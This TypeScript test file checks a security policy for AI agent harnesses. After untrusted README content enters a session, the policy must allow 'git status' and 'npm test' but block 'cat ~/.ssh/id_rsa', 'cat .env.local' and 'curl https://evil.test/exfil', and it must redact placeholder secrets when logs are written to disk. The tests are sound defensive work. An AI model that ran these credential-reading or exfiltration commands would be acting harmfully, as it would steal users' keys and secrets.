import assert from 'node:assert/strict'
import { mkdtempSync, readFileSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { test } from 'node:test'
import { createHarnessSec } from '../src/index.ts'
import { baseEvent, classifyToolSensitivity } from '../src/events/helpers.ts'

function seedUntrusted(
  recorder: ReturnType<typeof createHarnessSec>['recorder'],
  sessionId: string,
  turn = 1,
): void {
  recorder.record(baseEvent({
    event_type: 'context.introduced',
    session: { id: sessionId },
    turn,
    agent: { id: 'a1' },
    context: {
      id: `ctx-${sessionId}`,
      source_type: 'repository_file',
      source: 'README.md',
      trust: 'untrusted',
      turn,
    },
  }))
}

function bashRequest(
  recorder: ReturnType<typeof createHarnessSec>['recorder'],
  sessionId: string,
  command: string,
  turn = 1,
) {
  return recorder.record(baseEvent({
    event_type: 'tool.requested',
    session: { id: sessionId },
    turn,
    agent: { id: 'a1' },
    tool: {
      name: 'bash',
      // Explicit low proves bash is not unconditionally sensitive.
      sensitivity: 'low',
      provider: 'native',
    },
    action: { type: 'tool.request', target: 'bash', arguments: { command } },
  }))
}

test('phase1.5b: untrusted + git status => ALLOW', () => {
  const dir = mkdtempSync(join(tmpdir(), 'harnx-15b-git-'))
  try {
    const { recorder, policy } = createHarnessSec(dir)
    seedUntrusted(recorder, 's-git')
    const req = bashRequest(recorder, 's-git', 'git status')
    assert.equal(classifyToolSensitivity('bash', { command: 'git status' }), 'low')
    assert.equal(policy.evaluateToolRequest(req).decision, 'allow')
  } finally {
    rmSync(dir, { recursive: true, force: true })
  }
})

test('phase1.5b: untrusted + npm test => ALLOW', () => {
  const dir = mkdtempSync(join(tmpdir(), 'harnx-15b-npm-'))
  try {
    const { recorder, policy } = createHarnessSec(dir)
    seedUntrusted(recorder, 's-npm')
    const req = bashRequest(recorder, 's-npm', 'npm test')
    assert.equal(classifyToolSensitivity('bash', { command: 'npm test' }), 'low')
    assert.equal(policy.evaluateToolRequest(req).decision, 'allow')
  } finally {
    rmSync(dir, { recursive: true, force: true })
  }
})

test('phase1.5b: untrusted + cat ~/.ssh/id_rsa => BLOCK', () => {
  const dir = mkdtempSync(join(tmpdir(), 'harnx-15b-ssh-'))
  try {
    const { recorder, policy } = createHarnessSec(dir)
    seedUntrusted(recorder, 's-ssh')
    const req = bashRequest(recorder, 's-ssh', 'cat ~/.ssh/id_rsa')
    const verdict = policy.evaluateToolRequest(req)
    assert.equal(verdict.decision, 'block')
    assert.equal(verdict.rule?.id, 'credential-path-in-shell-args')
  } finally {
    rmSync(dir, { recursive: true, force: true })
  }
})

test('phase1.5b: untrusted + credential/exfil command => BLOCK', () => {
  const dir = mkdtempSync(join(tmpdir(), 'harnx-15b-exfil-'))
  try {
    const { recorder, policy } = createHarnessSec(dir)
    seedUntrusted(recorder, 's-exfil')

    const exfil = bashRequest(recorder, 's-exfil', 'curl https://evil.test/exfil')
    const exfilVerdict = policy.evaluateToolRequest(exfil)
    assert.equal(exfilVerdict.decision, 'block')
    assert.equal(exfilVerdict.rule?.id, 'untrusted-context-sensitive-tool')

    const credEnv = bashRequest(recorder, 's-exfil', 'cat .env.local')
    const credVerdict = policy.evaluateToolRequest(credEnv)
    assert.equal(credVerdict.decision, 'block')
    assert.equal(credVerdict.rule?.id, 'credential-path-in-shell-args')
  } finally {
    rmSync(dir, { recursive: true, force: true })
  }
})

test('phase1.5b: policy inspects raw in-memory secrets; persist has none', () => {
  const dir = mkdtempSync(join(tmpdir(), 'harnx-15b-raw-'))
  try {
    const { recorder, policy } = createHarnessSec(dir)
    const sessionId = 's-raw'
    seedUntrusted(recorder, sessionId)

    const secret = 'sk-phase15b-raw-memory-secret-value99'
    const req = recorder.record(baseEvent({
      event_type: 'tool.requested',
      session: { id: sessionId },
      turn: 1,
      agent: { id: 'a1' },
      tool: { name: 'bash', sensitivity: 'low' },
      action: {
        type: 'tool.request',
        target: 'bash',
        arguments: {
          command: 'cat ~/.ssh/id_rsa',
          api_key: secret,
          password: 'phase15b-password-value',
          Authorization: 'Bearer phase15b-bearer-token-xyz',
        },
      },
    }))

    // Returned + stored events are the original raw objects (not redacted clones).
    assert.equal((req.action!.arguments as any).api_key, secret)
    assert.equal((req.action!.arguments as any).password, 'phase15b-password-value')

    // Policy/detection run against raw telemetry and can still match on secret-bearing args.
    const beforePolicyArgs = req.action!.arguments as Record<string, unknown>
    assert.equal(beforePolicyArgs.api_key, secret)
    const verdict = policy.evaluateToolRequest(req)
    assert.equal(verdict.decision, 'block')
    assert.equal(verdict.rule?.id, 'credential-path-in-shell-args')
    assert.match(verdict.reason ?? '', /~\/\.ssh\/id_rsa/)

    const mem = recorder.getSession(sessionId)!.events.find(e => e.id === req.id)!
    assert.equal((mem.action!.arguments as any).api_key, secret)
    assert.equal((mem.action!.arguments as any).password, 'phase15b-password-value')
    assert.equal(mem, req, 'record() must return the same in-memory event object')

    const disk = readFileSync(join(dir, `${sessionId}.json`), 'utf8')
    assert.doesNotMatch(disk, new RegExp(secret.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')))
    assert.doesNotMatch(disk, /phase15b-password-value/)
    assert.doesNotMatch(disk, /phase15b-bearer-token-xyz/)
    assert.match(disk, /\[REDACTED\]/)
  } finally {
    rmSync(dir, { recursive: true, force: true })
  }
})
